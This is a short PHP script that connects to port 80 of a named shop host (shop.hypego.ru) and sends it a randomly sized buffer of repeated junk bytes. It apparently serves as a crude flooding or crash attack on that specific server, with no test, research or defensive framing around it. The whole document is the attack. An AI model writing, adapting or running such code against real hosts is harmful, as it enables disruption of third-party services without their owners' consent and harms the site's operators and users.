<?php
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$connection = socket_connect($socket, "shop.hypego.ru", 80);
$buffer = str_repeat("/\x10/\x9fffff\x2b", mt_rand(1000, 2000));
socket_sendto($socket, $buffer, strlen($buffer), "shop.hypego.ru", 80);
?>